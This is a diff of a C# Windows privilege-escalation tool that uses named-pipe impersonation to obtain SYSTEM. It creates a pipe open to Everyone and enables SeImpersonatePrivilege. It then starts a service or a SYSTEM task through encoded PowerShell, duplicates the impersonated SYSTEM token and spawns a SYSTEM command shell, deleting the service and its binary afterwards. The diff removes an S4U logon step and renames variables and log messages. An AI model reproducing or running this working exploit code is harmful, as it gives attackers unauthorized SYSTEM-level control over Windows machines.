@@ -17,18 +17,8 @@ namespace NamedPipeImpersonation.Library
     {
         public static bool GetSystemWithNamedPipe()
         {
+            var bSuccess = false;
             var isImpersonated = false;
-            bool status = Utilities.GetS4uLogonAccount(
-                out string s4uUser,
-                out string s4uDomain,
-                out LSA_STRING pkgName,
-                out TOKEN_SOURCE tokenSource);
-
-            if (!status)
-            {
-                Console.WriteLine("[-] Failed to determin S4U logon account information.");
-                return status;
-            }
 
             do
             {
@@ -40,15 +30,15 @@ namespace NamedPipeImpersonation.Library
                     cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                     lpDesktop = @"Winsta0\Default"
                 };
-                var creationFlags = PROCESS_CREATION_FLAGS.NONE;
+                var creationFlags = PROCESS_CREATION_FLAGS.None;
                 var pipeSecurity = new PipeSecurity();
                 var accessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
                 pipeSecurity.AddAccessRule(accessRule);
 
                 if (Helpers.IsCurrentProcessInJob())
-                {
-                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB;
-                }
+                    creationFlags |= PROCESS_CREATION_FLAGS.CreateBreakawayFromJob;
+
+                Console.WriteLine("[DEBUG] {0}", creationFlags);
 
                 Globals.ConnectEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ConnectEvent");
                 Globals.PipeEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ServiceEvent");
@@ -57,13 +47,13 @@ namespace NamedPipeImpersonation.Library
                 {
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to create service handling event.");
-                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(error, false));
                     break;
                 }
 
-                Console.WriteLine("[>] Trying to enable required privileges.");
+                Console.WriteLine("[*] Trying to enable required privileges.");
 
-                status = Utilities.EnableTokenPrivileges(
+                bSuccess = Utilities.EnableTokenPrivileges(
                     new List<string> { Win32Consts.SE_IMPERSONATE_NAME },
                     out Dictionary<string, bool> adjustedPrivs);
 
@@ -75,7 +65,7 @@ namespace NamedPipeImpersonation.Library
                         Console.WriteLine("[-] {0} is not available.", priv.Key);
                 }
 
-                if (!status)
+                if (!bSuccess)
                     break;
 
                 using (var pipeServer = new NamedPipeServerStream(
@@ -137,7 +127,7 @@ namespace NamedPipeImpersonation.Library
 
                                 Console.WriteLine("[+] Impersonated as \"{0}\" (SID: {1}).", accountName, stringSid);
 
-                                status = NativeMethods.DuplicateTokenEx(
+                                bSuccess = NativeMethods.DuplicateTokenEx(
                                     WindowsIdentity.GetCurrent().Token,
                                     ACCESS_MASK.MAXIMUM_ALLOWED,
                                     IntPtr.Zero,
@@ -145,11 +135,11 @@ namespace NamedPipeImpersonation.Library
                                     TOKEN_TYPE.TokenPrimary,
                                     out hPrimaryToken);
 
-                                if (!status)
+                                if (!bSuccess)
                                 {
                                     error = Marshal.GetLastWin32Error();
                                     Console.WriteLine("[-] Failed to get primary SYSTEM token.");
-                                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(error, false));
                                     hPrimaryToken = IntPtr.Zero;
                                 }
                             }
@@ -162,42 +152,17 @@ namespace NamedPipeImpersonation.Library
                         {
                             error = Marshal.GetLastWin32Error();
                             Console.WriteLine("[-] Failed to named pipe impersonation.");
-                            Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                            Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(error, false));
                         }
                     }
                 }
 
                 if (!isImpersonated || (hPrimaryToken == IntPtr.Zero))
-                {
                     break;
-                }
-                else
-                {
-                    Console.WriteLine("[>] Trying to S4U logon as \"{0}\\{1}\".", s4uDomain, s4uUser);
 
-                    status = Utilities.ImpersonateWithS4uLogon(
-                        s4uUser,
-                        s4uDomain,
-                        in pkgName,
-                        in tokenSource,
-                        new List<string> { "S-1-5-20" });
+                Console.WriteLine("[*] Trying to spawn token assigned shell.");
 
-                    if (!status)
-                    {
-                        error = Marshal.GetLastWin32Error();
-                        Console.WriteLine("[-] Failed to S4U logon.");
-                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("[+] S4U logon is successful.");
-                    }
-                }
-
-                Console.WriteLine("[>] Trying to spawn token assigned shell.");
-
-                status = NativeMethods.CreateProcessAsUser(
+                bSuccess = NativeMethods.CreateProcessAsUser(
                     hPrimaryToken,
                     null,
                     Environment.GetEnvironmentVariable("COMSPEC"),
@@ -211,11 +176,11 @@ namespace NamedPipeImpersonation.Library
                     out PROCESS_INFORMATION processInformation);
                 NativeMethods.NtClose(hPrimaryToken);
 
-                if (!status)
+                if (!bSuccess)
                 {
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
-                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(error, false));
                 }
                 else
                 {
@@ -234,7 +199,7 @@ namespace NamedPipeImpersonation.Library
 
             Console.WriteLine("[*] Done.");
 
-            return status;
+            return bSuccess;
         }
 
 
@@ -244,7 +209,7 @@ namespace NamedPipeImpersonation.Library
             IntPtr hService;
             var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
 
-            Console.WriteLine("[>] Trying to create and start named pipe client service.");
+            Console.WriteLine("[*] Trying to create and start named pipe client service.");
             Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
             Thread.Sleep(100);
             hService = Utilities.StartNamedPipeClientService();
@@ -252,7 +217,7 @@ namespace NamedPipeImpersonation.Library
             if (hService == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to start named pipe client service.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
             }
             else
             {
@@ -281,12 +246,12 @@ namespace NamedPipeImpersonation.Library
 
             if (hService != IntPtr.Zero)
             {
-                Console.WriteLine("[>] Deleting named pipe client service.");
+                Console.WriteLine("[*] Deleting named pipe client service.");
 
                 if (!NativeMethods.DeleteService(hService))
                 {
                     Console.WriteLine("[-] Failed to delete named pipe client servce (Service Name = {0}).", Globals.ServiceName);
-                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                 }
                 else
                 {
@@ -298,7 +263,7 @@ namespace NamedPipeImpersonation.Library
             {
                 if ((Globals.MethodId == 1) && File.Exists(Globals.BinaryPath))
                 {
-                    Console.WriteLine("[>] Deleting service binary.");
+                    Console.WriteLine("[*] Deleting service binary.");
                     File.Delete(Globals.BinaryPath);
                     Console.WriteLine("[+] Service binary is deleted successfully.");
                 }
@@ -323,7 +288,7 @@ namespace NamedPipeImpersonation.Library
                 Convert.ToBase64String(Encoding.Unicode.GetBytes(poshCode)));
             var binpath = "powershell.exe";
 
-            Console.WriteLine("[>] Trying to create and start a SYSTEM task.");
+            Console.WriteLine("[*] Trying to create and start a SYSTEM task.");
             Console.WriteLine("    [*] Task Name  : {0}", Globals.ServiceName);
             Console.WriteLine("    [*] Executable : {0}", binpath);
             Console.WriteLine("    [*] Arguments  : {0}", args);
